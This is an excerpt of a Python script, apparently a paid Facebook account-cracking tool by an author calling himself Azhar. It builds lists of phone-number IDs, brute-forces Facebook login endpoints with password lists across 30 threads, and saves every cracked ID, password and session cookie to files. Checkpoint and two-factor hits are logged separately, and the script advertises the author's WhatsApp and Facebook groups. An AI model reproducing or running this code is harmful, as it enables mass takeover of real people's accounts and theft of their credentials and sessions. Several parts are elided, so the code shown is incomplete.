...
try:
	...
	os.system('python Azhar_enc.py')
os.system('git pull -q')
print(' [•] Join Our Group')
os.system('xdg-open https://www.facebook.com/share/X1ujN8BcGoKR9HwS/?mibextid=qi2Omg/')
input(' [•] Press Enter ')
os.system('xdg-open https://chat.whatsapp.com/D2M1d3o7Nuh1Kg4nZysKln')
...
logo=(f"""\
     ...
     _         _                
\033[97;1m    / \    ___| |__   __ _ _ __ 
  \033[92;1m / _ \  |_  / '_ \ / _` | '__|
 \033[93;1m / ___ \  / /| | | | (_| | |   
 \033[97;1m/_/   \_\/___|_| |_|\__,_|_|   
                                    \033[92;1m XD
\033[1;37m----------------------------------------------
 [•] Author     :  Azhar
 [•] Whatsapp   :  03141616323
 [•] Tool       :  PAID
 [•] College    :  PUNJAB COLLEGE SKG
\033[1;37m----------------------------------------------""")
def linex():
	print('\033[1;37m----------------------------------------------')
def clear():
...
def pp():
	...
	try:
			li = ['https://github.com/AZHAR-TRICKER/Chand/tree/main']
			li = ''.join(li)
			...
			if ky in ck:
				...
				os.system('xdg-open https://wa.me/+923141616323?text=*HELLO*%2C%20*SIR*%20*I*%20*WANT*%20*TO*%20*YOUR*%20*Azhar*%20*TOOL*%20*PAID*%20*APPROVAL*%20/%20%20*My*%20*Key*%20*:*%20'+str(ky))
				pp()
...
def pak():
		...
		for nmbr in range(limit):
			...
			user.append(nmp)
		with tred(max_workers=30) as Azhar:
			clear()
			tl = str(len(user))
...
def rd1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [Azhar-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [Azhar-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/Azhar-R-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/Azhar-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(ids))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        #print('\r\r\x1b[1;31m [Azhar-CP] '+str(ids)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Azhar-R-CP.txt','a').write(str(ids)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def api(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [Azhar-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [Azhar-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/Azhar-COKIE.txt','a').write(ids+' | '+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/Azhar-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[Azhar-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'The action attempted has been deemed abusive' in po.get('error', {}).get('message', ''):
                                        sys.stdout.write('\r\r\033[1;31m [Azhar-M2] %s|\033[1;31mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [Azhar-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Azhar-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/Azhar-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [Azhar-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [Azhar-OK] %s | %s'%(ids,pas))
                                open('/sdcard/Azhar-file-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                open('/sdcard/Azhar-file-coki-OK.txt', 'a').write(ids+' | '+pas+' | '+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        ##########print('\r\r\x1b[38;5;208m [Azhar-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Azhar-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
